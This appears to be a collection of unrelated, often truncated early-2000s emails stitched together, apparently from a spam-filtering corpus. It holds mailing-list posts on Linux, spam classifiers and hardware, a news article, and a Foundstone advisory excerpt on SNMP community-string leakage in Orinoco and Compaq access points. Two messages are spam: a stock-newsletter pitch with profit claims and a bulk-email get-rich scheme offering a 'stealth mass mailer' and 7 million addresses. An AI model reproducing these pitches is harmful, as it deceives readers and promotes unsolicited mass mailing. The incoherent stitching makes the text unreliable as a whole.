 For example, say I have a company, and sales@company.com,
 info@company.com and tech@company.com arrive in the same mailbox.
 I don't want to reply to sales@company.com mails with the From:
 set to dave@company.com, I would like the mail to come from
 sales@company.com.
 
 Is there any way to do this? Bearing in mind that mail can arrive
 with my email in the To or Cc fields (and Bcc?), and it might be
 buried in a couple of dozen other recipients...
 
 Cheers,
 Dave.

 Dear Fool,
 
 Just before Enron plunged...
 
 ...16 of 17 Wall Street analysts were still urging you 
 to buy Enron's stock.  While the company piled up debt 
 and manufactured imaginary earnings, auditors gave the 
 balance sheet a big thumbs-up.  As investors lost 
 everything, Enron insiders pocketed millions.
 
 AND THAT should make every investor's blood boil!
 
 Frankly, the Enrons and Global Crossings of the world 
 infuriate me.  All the backroom manipulations dirty 
 dealing and cover-ups really make it hard to know who 
 you can trust.   And that is why we've created a NEW 
 investing service, ""David & Tom Gardner's Motley Fool 
 Stock Advisor"" -- to bring the Motley Fool co-founders' 
 extraordinary commitment to honest stock analysis, 
 fair dealing and complete disclosure to investors like 
 you on a regular and timely basis.
 
 The Motley Fool, which David and Tom founded back in 
 1993, is dedicated to the principle that given the 
 right tools...the average guy can find great success in 
 every aspect of his financial life.
 
 And now, David and Tom are applying this principle -- and 
 their extensive investing experience -- to the new 
 ""Motley Fool Stock Advisor.""  
 
 But as you'll see, this service isn't just about 
 ""buying more stocks.""  OUR GOAL in publishing the 
 ""Motley Fool Stock Advisor"" is twofold:  To help you 
 gain the knowledge, confidence and resolve to make 
 money in the U.S. stock market...while avoiding the 
 biggest mistakes, as well.
 
 The Wall Street analysts touting Global Crossing said 
 its worldwide fiber-optics network would make it the 
 king of telecom.  Now these shares are WORTH NOTHING.  
 Microstrategy was the poster child of the technology 
 bubble-after earnings restatements, the stock now sits 
 99% OFF its high!  Kmart's lousy inventory management 
 and marketing incompetence helped drive the company 
 into BANKRUPTCY.
 
 WHAT ABOUT Nortel and Lucent-two of America's most 
 widely owned stocks.  Will they ever come back?  How 
 about AOL?  Does its merger with Time-Warner mean the 
 GLORY DAYS are over -- or have they just begun?   Are 90% 
 of all telecommunications companies truly in danger of 
 disappearing? If so, which will survive? Will great 
 old names like JP Morgan, Disney and Motorola recover?  
 
 Well, those are the sorts of questions David & Tom 
 Gardner can help you answer at the ""Motley Fool Stock 
 Advisor.""  
 
 As they say, ""Show us the money.""  When it comes to 
 making promises, fast-talkers can fudge just about 
 anything.  But CASH FLOW doesn't lie.
 
 YOU CAN avoid a lot of big mistakes by simply making 
 sure a company has the cash coming in to pay its 
 bills.  And watching cash flow is also one of the best 
 ways to identify superstar companies -- far more reliable 
 than ""earnings"" that can be manipulated 8 ways to 
 Sunday.  Once you eliminate big losers from the 
 equation -- and target the true superstars -- you'll find 
 investing more fun...less stressful...and much more 
 profitable, as well.
 
 So forget about Wall Street's ""damaged goods""-
 companies that have a boatload of debt and accounting 
 woes, as well.  Keep it SIMPLE instead.
 
 ""Simple"" means investing in companies that we all -- with 
 a little effort -- can understand.  Companies where we 
 know what businesses they're really in.  Companies 
 where the financial statements actually mean 
 something.  And companies easily recognizable as the 
 ""best of breed.""
 
 In the free report you received, ""The One Stock That 
 Keeps Wall Street BUZZING,"" you read about one of 
 David & Tom's very favorite investments: Starbucks.  
 Before this company came along, most folks just took 
 coffee for granted.  And certainly, no one proposed 
 any far-reaching business model built around it.  Yet 
 these innovators took a low-margin commodity and built 
 a near $3 BILLION company with more than 5000 
 retail outfits all around the world.
 
 Starbucks has been able to open new outlets based on 
 money it has earned from existing ones. That is an 
 astounding testament to its economic power.  At The 
 Motley Fool Stock Advisor we'll help you find and 
 truly understand the great investments, the companies 
 with solid balance sheets and real growth prospects.   
 Right now we're following companies such as:
 
 *America's most prestigious jeweler -- its brand name 
 has no rival.  With net margins of 59% on sales of 
 $1.6 Billion, this company is a great pick for solid 
 returns with low risk.   
 
 *This software company commands more than 25% of the 
 video game market.  Its shares have returned 6,000% 
 since its public debut in 1989.  An investment of 
 $5,000 in 1989 is now worth over $300,000.  The video 
 game market is expected to double by 2005 with this 
 company enjoying the lion's share of the growth.
 
 *This premier credit rating company has locked-in 
 demand for its reports on the creditworthiness of 
 borrowers holding $30 trillion of the world's debt.  
 It has a 20-year record of consistent sales and income 
 growth and is poised for another stellar year.
 
 YOU CAN TRY the ""Motley Fool Stock Advisor"" for six 
 full months 100% RISK-FREE.  If we don't prove its 
 worth to you, it doesn't cost you a dime.
 
 As a Charter Subscriber, you get the ""Motley Fool 
 Stock Advisor"" delivered to your home each month; a 
 monthly, between-issue, e-mail Fool Flash to help you 
 take full advantage of breaking news; full use of the 
 Motley Fool Stock Advisor subscriber-only Web site,

 Sincerely yours,
 
 Mike Bell, Publisher
 ""David & Tom Gardner's Motley Fool Stock Advisor""
 
 P.S. Do you like BIG PROFITS?  In 1994, investment 
 pros sniffed at America Online's high-flying stock and 
 screamed, ""Overvalued.""  But the Gardners saw three 
 things they overlooked: 1) AOL was building the 
 premier stop in cyberspace; 2) They had a great 
 retention strategy; and 3) Millions of members paying 
 $$$ every month.
 
 So Tom and David bought it.  And today they're sitting 
 on whopping 4,120% gains.  So you see, while they do 
 structure their investing strategy to avoid big 
 blunders...they do make a lot of money, too.  To try the 
 ""Motley Fool Stock Advisor"" RISK-FREE, click here now:

 Isn't it just basically a mixture of beaten egg and bacon (or pancetta, 
 really)? You mix in the raw egg to the cooked pasta and the heat of the pasta 
 cooks the egg. That's my understanding.

 ALB> Selling Wedded Bliss Big Business in Thailand
 ALB> Thu Aug 29,10:19 AM ET
 ALB> By Andrew Marshall
 
 ALB> BANGKOK, Thailand (Reuters) - English dentist Ken Moylan came to Thailand
 ALB> looking for a wife. It took two hours to find her.
 
 ALB> ""The first day I went out with Wan, she came back to my hotel and hung all
 ALB> my clothes up and tidied the room. I thought it was marvelous,"" he said. ""I
 ALB> knew then there was something special.""
 
 ALB> Moylan, 49, is one of thousands of men who use introduction agencies to meet
 ALB> -- and marry -- Thai women. He lives in England now with 28-year-old Wan,
 ALB> who is expecting their first child.
 
 ALB> Critics of marriage agencies say they exploit the grinding poverty of women
 ALB> in developing countries, offering dreams of a new life in the West that
 ALB> often turn sour. But Moylan says he has no regrets about coming to Thailand
 ALB> in search of a wife.
 
 ALB> ""I got to Thailand at 2 p.m., and by 4 p.m. I'd met Wan,"" he said. ""I knew I
 ALB> found her attractive. I could tell straight away that she was very caring.""
 
 ALB> Moylan spent a week in Thailand, and after returning to England kept in
 ALB> touch with Wan by phone and mail. Six months later she came to England and
 ALB> the couple married.
 
 ALB> MR. MARRIAGE
 
 ALB> Lawrence Lynch, 49, runs Thai Professional Introduction Services, the agency
 ALB> Moylan used to meet his wife. Lynch, who calls himself ""Mr. Marriage,""
 ALB> started the company after also marrying a Thai woman through an introduction
 ALB> agency.
 
 ALB> Since then he has helped set up hundreds of marriages.
 
 ALB> ""In the last five years we've done about 400,"" he said. ""To the best of my
 ALB> knowledge, they have all been successful.""
 
 ALB> Male clients pay $2,213 for the service, although men from countries that
 ALB> require them to handle some of the visa work on their own get a discount.
 ALB> Clients then get to view catalogs and videos of hundreds of Thai women
 ALB> looking for a husband. If they like what they see they come to Bangkok.
 
 ALB> Clients are introduced to several women in chaperoned meetings in Lynch's
 ALB> office -- encounters that can often be awkward given mutual shyness and
 ALB> language problems.
 
 ALB> ""We find that the gentlemen are usually just as nervous as the ladies,""
 ALB> Lynch said. ""But once they start meeting the ladies they soon relax.""
 
 ALB> After the first meeting, couples can decide to go on dates to get to know
 ALB> each other better. Within two weeks of arrival, Lynch says, almost every
 ALB> client has found a potential wife.
 
 ALB> ""At the end of a fortnight it's very, very rare for a guy to go back and
 ALB> think he hasn't made his mind up,"" he said. In most cases, marriage follows,
 ALB> usually within the next year.
 
 ALB> Roongthip Kamchat, managing director of Thai No. 1 Connections, a
 ALB> Bangkok-based agency, says she has introduced about 1,000 couples, and less
 ALB> than 10 percent have broken up.
 
 ALB> Roongthip says she sometimes has a difficult time calming men who have just
 ALB> arrived in Bangkok looking for a wife.
 
 ALB> ""Sometimes they are very nervous,"" she said. ""And sometimes they are very
 ALB> impatient and say 'Give me a lady, I want to get married now.' I say: 'Calm
 ALB> down, OK, we'll talk.""'
 
 ALB> But if men are really in a hurry, Roongthip says, she can find them a wife
 ALB> and get them married within a week. Lynch says clients he has found wives
 ALB> for include a blind man, a man with one leg and a man with post-traumatic
 ALB> stress disorder.
 
 ALB> WHY?
 
 ALB> Similar marriage agencies can be found in many developing countries. Critics
 ALB> say they thrive on the neediness of lonely Western men who are unable to
 ALB> form relationships in their own country, and on the desperation of
 ALB> impoverished women who believe they can find a better life in the West.
 
 ALB> But Moylan says that if the arrangement makes both partners happy, there is
 ALB> no reason to object. ""If you talk about people who are needy, I think
 ALB> everybody wants someone to love them, and wants someone to love, so yes, I
 ALB> need Wan,"" he said.
 
 ALB> ""Thai women are dissatisfied with life in Thailand. I think there's no
 ALB> secret there. They are looking for a better life. I don't have a problem
 ALB> with that. In return they are willing to give a lot of love and care to
 ALB> their future husband.""
 
 ALB> Lynch says men are dissatisfied with Western women too, and that is why they
 ALB> choose to use his agency.
 
 ALB> His brochure promises an alternative to the ""kind of de-feminized,
 ALB> over-sized, self-centered, mercenary-minded lady available on the British
 ALB> singles scene,"" and says he can make dreams come true even for men who are
 ALB> not ""God's gift to women.""
 
 ALB> Roongthip said many Western men found it difficult to meet women in their
 ALB> own countries -- and found Thai women attractive.
 
 ALB> ""They don't know how to meet women. Even if they go to pubs or discotheques
 ALB> or restaurants or department stores, how can they ask people to marry them?
 ALB> Impossible,"" she said.
 
 ALB> ""Many Thai girls are slim, have long hair, black eyes, small nose. They are
 ALB> good at taking care and joking and laughing, not strict. Different from
 ALB> ladies from other countries.""
 
 ALB> Although many couples married through agencies have a considerable age gap,
 ALB> the agencies say this is not a problem. They say language problems are also
 ALB> not a major obstacle.
 
 ALB> ""Thai ladies are not ageist, and they have no qualms whatsoever about having
 ALB> a husband who is significantly older,"" Lynch said. ""When I met my wife she
 ALB> couldn't speak a word of English. We muddled along with a phonetic
 ALB> dictionary. The ladies are very keen to learn English and they pick it up
 ALB> very quickly.""
 
 ALB> Many agencies also offer tuition for woman on what to expect when they move
 ALB> to the West.
 
 ALB> ""We have kitchens, we have study classes,"" Roongthip said. ""We teach them
 ALB> how to eat, and when to make tea.""
 
 ALB> PITFALLS
 
 ALB> But not all dreams come true. ""Bee"" is a 26-year-old Thai woman who went to
 ALB> Switzerland two years ago with a man she met through an agency. Now she is
 ALB> back in Bangkok, sad and angry.
 
 ALB> ""He had no friends, and I was so lonely,"" she said. ""I tried to make him
 ALB> happy but he just wanted sex and somebody to keep his house clean. He never
 ALB> spoke to me.""
 
 ALB> Bee came back to Bangkok earlier this year. ""I thought I would be happy
 ALB> there,"" she said. ""But it was the worst time of my life.""
 
 ALB> Lynch says that while some agencies are badly run, he makes checks to ensure
 ALB> unsuitable candidates are weeded out.
 
 ALB> ""We are ethical and professional,"" he said. ""We will not take on all
 ALB> comers.""
 
 ALB> Moylan says that despite possible pitfalls, his own marriage is proof the
 ALB> arrangement can work. Wan's sister has just signed up with Lynch's company,
 ALB> looking for a foreign husband.
 
 ALB> ""Perhaps there are cases of women being exploited. I'm sure there are,""
 ALB> Moylan said. ""But in the majority of cases the women get a good deal.""

 OK, so, you get the XML toss it through hardware and turn it back into a
 struct/object whatever you call your binary data. I agree this is the way
 things will go, as XML parsing has just too much overhead to survive in the
 application layer. So why turn it into XML in the first place? Becasue it
 gives geeks something to do and sells XML hardware accelerators and way more
 CPUs?

 As Kevin said, the problem can reputedly be solved using Donald Becker's 
 Linux-native utilities for the 3C5X9 series.  Turn off PnP, and then set 
 the IRQ and I/O base address as required.  Make sure those are also
 made available in the motherboard BIOS Setup program to ""Legacy ISA
 devices"" or whatever it's called, there.

","It seems to only support PPPoA and not PPPoE. You need one that supports
 PPPoE, if you want torun it in routed IP mode. If you are using it as a
 bridge, it'll probably work, but you'd be left leaving the computer on,
 which would defeat the purpose of getting a router.
 
 The best router I've come accross is the Zyxel 643. Eircom supply this,
 but if you have alook online you can probably find it cheaper to buy
 online from America or the UK.
 
 Hope this is useful,

 Barbie has been made over as a Bond girl:  
 
     [IMG: http://www.craphound.com/images/bondbarbie.jpg] As James Bond, Ken 
     has matured nicely with rooted hair, with slight silvering at his temples, 
     wearing a midnight blue tuxedo, and authentic recreation of the classic tux 
     by Brioni, the famed clothier. Linda Hemming, the award winning costume 
     designer in charge of this year's James Bond film, outfits Barbie doll. She 
     wears a blood red gown with a glittering gold lace overlay and a gauzy red 
     shawl with a gold filigree design. Her gown is cut up the side to reveal 
     lots of leg as well as not so discreet hip strap that anchors Barbie's cell 
     phone. The set is slated for release in November, to coincide with the 
     premiere of ""Die Another Day,"" the new James Bond film. Bond, James Bond, 
     meet Barbie, just Barbie...

 Folks,
 
      There have been several major internet outages this morning,
      across major providers UUNet, Genuity, and god knows who else.
      Various routes across the Internet backbones have been
      disappearing, repropagating, and disappearing again.
 
      This has caused and exacerbated several problems which we are
      working on correcting right now.  We apologize for the
      inconvenience..

366,"Subject: Apt problems
","Two issues:
 
 --<snip>--
 Sorry, but the following packages have unmet dependencies:
   openssh: Depends: openssl (= 0.9.5a) but 0.9.6b-8 is installed
   php-pgsql: Depends: postgresql but it is not installed
              Depends: libpq.so.2
 E: Unmet dependencies. Try using -f.
 --</snip>--
 
 1. I have the following openssl packages installed:
 
 --<snip>--
 openssl-perl-0.9.6b-8
 openssl-0.9.6b-8
 openssl095a-0.9.5a-11
 openssl-devel-0.9.6b-8
 --</snip>--
 
 The openssl095a package should provide the openssl-0.9.5a compatibility 
 but apt doesn't think so? 
 
 2. I have postgresql installed from the source. So that's why I need 
 php-pgsql. Is there a way to tell apt about packages I don't want it to 
 complain about?

 My guess is it's more insidious than that, it's going to be ActiveSpam.

 what is this obsession of yours with cats that hunt?  you realise that
 while cats will sometimes bring birds to your bed, it's the wrong kind

","Foundstone Labs Advisory - 080902-APIL
 
 Advisory Name:	Information Leakage in Orinoco and Compaq Access Points
  Release Date:	August 9th, 2002
   Application:	Orinoco Residential Gateway and Compaq WL310
     Platforms:	N/A
      Severity:	The ability to display/modify configuration information
       Vendors:	Orinoco (http://www.orinocowireless.com) and
                   Compaq (http://www.compaq.com)
       Authors:	Marshall Beddoe (marshall.beddoe@foundstone.com)
                   Tony Bettini (tony.bettini@foundstone.com)
 CVE Candidate:	CAN-2002-0812
     Reference:	http://www.foundstone.com/advisories
 
 Overview:
 
 An information leakage vulnerability exists in Orinoco and Compaq OEM 
 access points, disclosing the unique SNMP community string. As a result,
 
 an attacker can query the community string and gain the ability to
 change
 system configuration including Wired Equivalent Privacy (WEP) keys and 
 Domain Name Service (DNS) information.
 
 Detailed Description:
 
 The Compaq WL310 is an OEM Orinoco Residential Gateway access point.
 Both the Compaq and Orinoco access points use a unique identification
 number
 found on the bottom of the access point for configuration through
 their management client. This identification string is used as the
 default SNMP read/write community string. The community strings appears
 to be unchangable, unique, and not easily guessable. By sending a
 specific packet to UDP port 192, the access point will return
 information including the firmware version and the unique identification
 value. The packet returned includes the value of system.sysName.0, which
 in the case of the Compaq WL310 and Orinoco Residential Gateway,
 includes
 the unique identification value. The identification value can then be

 Exactly -- ""let's you and him fight"" is a
 way of dealing with troublesome populations
 by moving them next to one another, so they
 give each other, and not the Man, grief*.
 
 So by my understanding (and, you all will
 understand, with tongue firmly in cheek):
 
 Ireland:  Irish?  Uppity barbarians overly
    fond of ""risings"".  Scots?  More uppity
    barbarians overly fond of ""risings"".
    Why not plonk down a bunch of the latter
    next to the former and kill two birds
    with one stone?
 
 Israel:  Ex-ottomans?  Uppity barbarians
    (didn't they help kick out the Ottomans?)
    Zionists?  Uppity sorts who aren't happy
    with perfectly good land in Uganda.  Why
    not plonk down a bunch of the latter next
    to the former and kill two birds with one
    stone?
 
 but not:
 
 India: in which the muslims and hindus were
     originally intermixed to some degree,
     but Partioned due to their own conflict,
     not due to English resettlement policy.
 
 Canada: in which the french and english were
     already established, and it was just the
     balance of power on the continent that
     determined events in the colonies.  The
     Acadians got resettled, but they don't
     seem to have been that good for picking
     fights with their neighbors, so no one
     had them plonked down next door.

 One thing that's wrong is who some of us choose as babysitters.  Too many 
 kids are put in front of the television for hours each day, to be 
 influenced by what the media and government thinks is important.  I 
 learned a long time ago that what they think is important and what is are 
 two different things.  I threw the TV out when Xi was 9.  She's got her 
 own place now, and still doesn't have one.  YaY!  Another thing that's 
 wrong is what goes on in public schools.  Some allow a bit of 
 individuality, but only for a class or a short period of time, depending 
 on the teachers, most of the time.  I dunno how many times I've seen Xi 
 come home from school absolutely miserable or outraged about something 
 that happened at school.  She made it to college, though, whew.  It's a 
 big problem to tackle, and I don't know the answer.  I like the idea of 
 the voucher system, because in a way it is a way parents can vote more 
 efficiently for how their kids are taught.

 Sure it is - it tends to bring out the people who let ""hysterical
 right wing propaganda"" spew forth, while reaching for their gun 
 whenever a ""liberal"" enters the room.
 
 my hysterical left wing ""propaganda"" is generally an emotional
 reaction on a mailing list, not an organizaed attempt at converting
 people's thinking through lies and distortion (as was the original
 article). 
 
 Whereas your constant and predictable brandings of my postings are, to

 The total collections are 1100 messages.  I trained with 1100/5

 I tried the ""Anthony"" stuff, but it didn't make any appreciable
 difference that I could see from staring at the false negative rate.
 The numbers are big enough that a quick eyeball suffices.
 
 Then I tried a dirt simple tokenizer for the headers that tokenize the
 words in the header and emitted like this ""%s: %s"" % (hdr, word).
 That worked too well :-).  The received and date headers helped the
 classifier discover that most of my spam is old and most of my ham is
 new.
 
 So I tried a slightly more complex one that skipped received, data,
 and x-from_, which all contained timestamps.  I also skipped the X-VM-
 headers that my mail reader added:
 
 class MyTokenizer(Tokenizer):
 
     skip = {'received': 1,
             'date': 1,
             'x-from_': 1,
             }
 
     def tokenize_headers(self, msg):
         for k, v in msg.items():
             k = k.lower()
             if k in self.skip or k.startswith('x-vm'):
                 continue
             for w in subject_word_re.findall(v):
                 for t in tokenize_word(w):
                     yield ""%s:%s"" % (k, t)
 
 This did moderately better.  The false negative rate is 7-21% over the
 tests performed so far.  This is versus 11-28% for the previous test
 run that used the timtest header tokenizer.
 
 It's interesting to see that the best descriminators are all ham
 discriminators.  There's not a single spam-indicator in the list.
 Most of the discriminators are header fields.  One thing to note is
 that the presence of Mailman-generated headers is a strong non-spam
 indicator.  That matches my intuition: I got an awful lot of
 Mailman-generated mail, and those lists are pretty good at surpressing
 spam.  The other thing is that I get a lot of ham from people who use
 XEmacs.  That's probably Barry, Guido, Fred, and me :-).
 
 One final note.  It looks like many of the false positives are from
 people I've never met with questions about Shakespeare.  They often
 start with stuff like:
 
 > Dear Sir/Madam,
 > 
 > May I please take some of your precious time to ask you to help me to find a
 > solution to a problem that is worrying me greatly. I am old science student
 
 I guess that reads a lot like spam :-(.

 I don't care if the mail is foldered on python.org, but personal

 Note also that we are much more liberal about python.org/zope.org

 assert strict copyright over their collections, are very protective of

 Which might be an appropriate for their lists, but not for ours (don't

 It's not just krpm, the desktop HDs have a higher failure rate. But I
 agree, EIDE has high density, and EIDE hardware RAID can offer SCSI a
 sound beating for reliability, performance, and storage density/rack units
 for the money, if designed for it, and if people would actually start 
 buying it.

 There are not all that many hard drives inside an 1U enclosure. Airflow
 blockage (you have to fit in 2-3x the number of SCSI disks with EIDE) will
 soon be a thing of the past due to SATA.

 Since rack-space costs dominate, and our systems need more or less decent
 I/O we're going with 1U Dells with SCSI. The hard drive prices don't
 really make a visible difference, given the cost of the iron, and the
 rackspace/month. Plus, 1U Dells don't have any space left for lots of EIDE
 drives.

 Last time I tried this (see tokenizer.py comments), the f-n rate after
 stripping tags ranged from 0.982% to 1.781%, with a median of about 1.34%,
 so we've made tons of progress on the f-n rate since then.  But the mere
 presence of HTML tags still remains a significant clue for c.l.py traffic,
 so I'm left with the same comment:
 
 > # XXX So, if another way is found to slash the f-n rate, the decision here
 > # XXX not to strip HTML from HTML-only msgs should be revisited.
 
 If we want to take the focus of this away from c.l.py traffic, I can't say
 what effect HTML stripping would have (I don't have suitable test data to
 measure that on).

396,"Subject: Never pay eBay listing fees again!
","Hi,
 
 I'm a college dropout.  I work about two hours a day.  
 I'm ambitious, but extremely lazy, and I make over 
 $250,000 a year.  Are you curious yet?
 
 In a minute I'm going to tell you my secret,
 it's the dirty little secret of the Internet ...
 
 You've probably heard stories about people making
 whopping huge money online, but you thought they 
 were the big corporate execs, famous programmers, or
 boy-geniuses.
 
 Well, grasshopper, think again ...
 
 It's people like you and me that are making the real
 money.  Yep, people like YOU AND ME!
 
 Ever since the ""dot com bubble"" burst in 1999, small-time
 entrepreneurs are getting richer while the Fortune 500 
 companies look for bankruptcy lawyers.
 
 Today small business owners and ordinary folks 
 like you and me can use the web to achieve complete 
 financial freedom with NO INVESTMENT and very little 
 work.  How?  By learning the most profitable marketing 
 technique ever created - it's called BULK EMAIL.
 
 If you've ever recieved an email advertisement, then 
 you know what bulk email is.  I bet you can't click on 
 DELETE fast enough for most of those ads, right?
 You might not want their product, but remember that 
 thousands of other folks probably do.  Bulk email is a 
 percentage game - every bulker who contacts you 
 makes a six figure income on the Internet.  I 
 guarantee it.  Now let's go back to Math 101 and 
 review some numbers ...
 
 If you sell on eBay, you pay anywhere from a few
 dollars to over a hundred dollars just to post one
 auction.  How many people see your ad?  Maybe a
 couple thousand or even ten or twenty thousand
 over a period of days.  Using bulk email, YOU CAN
 SEND YOUR AD TO MORE THAN A MILLION PEOPLE A DAY
 at virtually no cost.  Whether your send 100,000
 emails or 100 million emails, the price is the same.
 ZERO!
 
 Stop paying those outrageous auction listing fees when
 hardly anyone sees your ad!
 
 Imagine that you have a decent product with a 
 profit margin of $20.00 on each sale.  If you send 
 an email ad to 500,000 people, and only one person 
 in a thousand actually places an order, then you just 
 generated 500 orders and made $10,000 in a few hours 
 of work.  
 
 It's that simple ...
 
 All you have to do is convince ONE PERSON OUT OF A
 THOUSAND to buy your stuff and you're FILTHY RICH.
 
 The best thing is that anyone can do it.  Doesn't 
 matter if you're a nineteen-year-old college student 
 using a dorm-room computer or a fifty-year-old 
 executive working from an office building in New 
 York City.  Anyone, and I repeat ANYONE, can start 
 bulk emailing with virtually no startup costs.  All 
 it takes is a  few days of study, plenty of ambition, 
 and some basic familiarity with the Internet.
 
 I quit college when I was 19 to capitalize on the 
 ""Dot Com"" mania, and I've never looked back.  I 
 started with no money, no product to sell, and only 
 the most rudimentary computer skills.  I saw an 
 opportunity and I seized it.  A few years later, 
 I bought my own home - with CASH.  
 
 You don't need any money.  You don't need a product.
 You don't need to be a computer nerd and no experience
 whatsoever is required.  
 
 If you saw an employment ad in the newspaper like that
 you'd jump right on it.  It would be a dream come true.
 So what are you waiting for?!
 
 I'm going to ask you four simple questions.  If you answer
 YES to all of them, then I can almost promise that you
 will make at least $100,000 using bulk email this year.
 
 Here goes ...
 
 Do you have basic experience with the web? 
 Do you have a computer and an Internet connection?
 Do you have a few hours each day of free time?  
 Do you want to earn some extra money with an eye towards 
 complete financial freedom?  
 
 If you answer YES to these questions, you could be
 making $5,000 - $20,000 per week working from your 
 home.  Kiss your day job goodbye - this sure beats 
 the 9-5 daily grind!
 
 All you need is ambition and commitment.  This
 is no ""get rich quick scheme"".  You have to work
 to make big bucks, but ANYONE - and I mean ANYONE - can do 
 it.
 
 You're probably wondering if it's hard to get started.  
 Don't worry, it's not! I will show you step-by-step 
 how to start your first email campaign and how to
 build a booming online business.  You'll be generating 
 orders - AND MAKING MONEY - in less than seven days.
 
 Okay, so what if you don't have anything to sell?
 
 No problem!!  I'll show you where to find hot
 products that sell like CRAAAAAAZY! Most people delay
 starting an Internet business because they have 
 nothing to sell, but I'm removing that hurdle right now.  
 After reading the Bulkbook, you can build your complete 
 product line in less than two hours!  There is NO EXCUSE 
 not to get started! I will get you up-and-running within 
 seven days. In fact ...
 
 I personally guarantee that you will start your own 
 bulk email campaign less than a week after reading 
 the Bulkbook!  I'll give you a toll-free phone number 
 to reach me 24 hours a day, seven days a week; 
 where else will you find that level of service?!
 
 I will also include a step-by-step guide to starting 
 your very first email campaign called ""Seven Days to 
 Bulk Email Success"".  This seperate guide contains a daily 
 routine for you to follow with specific, exact 
 instructions on how to get started.  On day one, for 
 example, I teach you where to find a product to sell. 
 The next day you learn how to build a fresh mailing 
 list.  On the seventh day, you just click send!  Your 
 very first campaign is ready to go.
 
 As a special bonus, you'll recieve a FREE copy 
 of our STEALTH MASS MAILER, a very powerful bulk 
 email program which retails for $49.99! I'll even
 include 7 million email addresses absolutely FREE
 if you order NOW!
 
 Stop wasting your money on auction listing fees, 
 classifieds, and banner ads - they don't work, and 
 never will!  If you are SERIOUS about making money 
 on the Internet, bulk email is your only option.  
 What are you waiting for?  Few of us are willing 
 to share this knowledge, but I promise to teach 
 you everything I know about bulk emailing in this 
 extraordinary bulk emailer's handbook ... The Bulkbook! 
 
 Once again, here's the deal.  You give me $29.99.

 I'm not seeing a hit on 'next'. A quick ""just pound on 'next' and watch the
 wall clock"" test shows me able to go through 20 messages in under 5 seconds,
 so it's well under 250ms per switch, but I'm seeing a really piggy CPU spike
 (100% for a few seconds) in the 'flist' code.  Of course, it seems to be
 related to number-of-folders:
 
 [~] wc Mail/.folders
     131     131    1122 Mail/.folders
 
 It's particularly annoying because things just hose-and-hang for 10 seconds, so
 when it hits, you have a long latency before what you're doing actually
 happens...

 14:11:03 FlistFindStart reset=0 active=0

 I'm perfectly willing to can-opener that code and see where the CPU is
 going, but only if nobody is slapping their forehead and mumbling about
 a brown-paper-bag bug... ;)

401,"Subject: [ILUG] Optimising for PentiumMMX?
","I've been playing with an old Dell OptiPlex5110 and decided to attempt to 
 build a PentiumMMX optimised Linux on it.
 
 To start, I installed the bare minimum Debian system for  compiling programs.
 
 Next I built a custom kernel, since most CPU optimizations are best suited to 
 the kernel code.
 
 Next I built X4.2.0 from sources, especially since X make a lot of use of 
 matrixes and can also benifit from MMX optimizations. Since the first build, 
 I've been encouraged to play with the CVS of both XFree86 and the DRI stuff, 
 so I will be re-building X once we get some bugs worked out.
 
 Finally I built KDE3.0BETA1 from sources I had, again to take full advantage 
 of the MMX processor.
 
 Can anyone recommend other minimum tools that I should re-build to get even 
 more improvements in system performance? I know that not all packages can, or 
 do benefit from being built on PentiumMMX rather than the i386 that Debian 
 compiles to, but have I covered everything that CAN benefit?
 
 I am wondering if the C, and other libraries  should be re-built? Can they 
 take advantage of the Pentium and MMX instructions for system performance? 
 And would this require re-building gcc as well?
 
 I realise that not everything can benefit from re-compiling. I.E. I doubt I 
 would see much system improvement if I re-compile bash, but things like the 
 kernel, X and KDE should improve performance.
 
 On a related note, I know I've mentioned here before, but I'm still looking 
 for a Slot 1 550Mhz PIII. My regular system is a Dual PII350 and the 440BX 
 M/B can take PIII's. I managed to get my hands on one. If I could get another 
 I could put the two PIII's into this box and re-compile X to use the 
 SSE/Katmai instructions in the PIII. I just don't thing it is worth replacing 
 two PII's with one PIII. I know that they are out-of-stock, and I do watch 
 the Buy-N-Sell regularly, but short of buying a full PIII system, I've not 
 had much luck.
 
 Cheers,
 
 	John Gay

 DVDs don't use trusted hardware. As for whether it is worth it, that 
 depends entirely on what its worth to secure your software.

409,"Subject: Living Love - Another legacy of the 60's
","Normally, I disdain any kind of mysticism, even when it is associated 
 with fairly good ideas.  Just a big turnoff.  A good example would be 
 the difference between Yoga/TM and the more scientifically pure, but 
 related, relaxation techniques including ""betagenics"", 
 hypnosis/auto-hypnosis, etc.  (This was one of the many topics I 
 obsessively absorbed as a teenager.)  Or Tai Chi etc. vs. Tai Bo / 
 G-Force Dyno-Staff.
 
 I have to say however that, having found this while looking for 
 something completely unrelated, it has some cute truisms.  I 
 particularly like their addiction to non-addiction.  Additionally, the 
 Mindprod treehugger site has some interesting quotes, etc.
 
 To my internal ear, nearly all of these 60's based new-age vernacular 
 seem to assume that you are a simple child (of the 60's?) who needs some 
 religion-like couching of ideas to relate and internalize.  Very 
 irritating, but taken in small doses it's interesting to compare and 
 contrast with our (my) modern mental models.
 
 I found that a few of the principles could be used to explain and 
 justify US/UN foreign policy and actions.

 You make yourself and others suffer just as much when you take offence

 waste what you do have.
 
 The past is dead,
 The future is imaginary,
 Happiness can only be
 in the Eternal Now Moment
 
 How soon will you realize that the only thing you don't have is the 
 direct experience that there's nothing you need that you don't have.
 
 Love a person because he or she is there.
 This is the only reason.
 
 Happiness happens when your consciousness is not dominated by addictions 
 and demands~ and you experience life as a parade of preferences.
 
 The
 purpose
 of our lives
 is to be free
 of all addictive traps,
 and thus
 become one
 with the ocean of
 Living Love.

 No, that would be rather silly. There are conflicting reports on whether
 Zambia is prepared to accept milled GM grain or not - and, from reports from
 various sources, considerable debate within that country. There's complex
 issues, not all of which can be dismissed by blaming those nasty
 environmentalists, which was my original point.

 Well, SpamAssassin will just ignore any old X-Spam-whatever headers
 it finds, so that cannot be used to get around the filter.

 Yes, them too.  When wolves attack their sheep, they coral the wolf
 into a quarry and then throw rocks from the surrounding cliffs so
 that ""no one will know who killed the wolf""
 
 In Samskar, before the Chinese arrived, there had not been a killing
 in over 2000 years, and the last recorded skirmish, over rights to

 I would be in favor of creating new SpamAssassin CVS modules and
 Bugzilla categories for other clients (provided there is sufficient
 interest and a maintainer).

 The best I can think of is to figure out what the command being 
 issued by exmh is that selects and inserts the sig and bind that to a 
 key sequence.  That shouldn't be *too* difficult, it's just a matter 
 of figuring out the tcl (something my perl-based brain isn't excited

 what's the deal with all this latency? it's not like that in other places 
 where I've used dsl. i read some story about it being done that way to 
 allow greater distances to be covered or something like that. however, my 
 knowledge of physics is really only newtonian, and I don't understand how 
 worsening latency could possibly improve the reliability of a 2000 foot 
 long piece of copper. Perhaps it has something to do with stretching the 
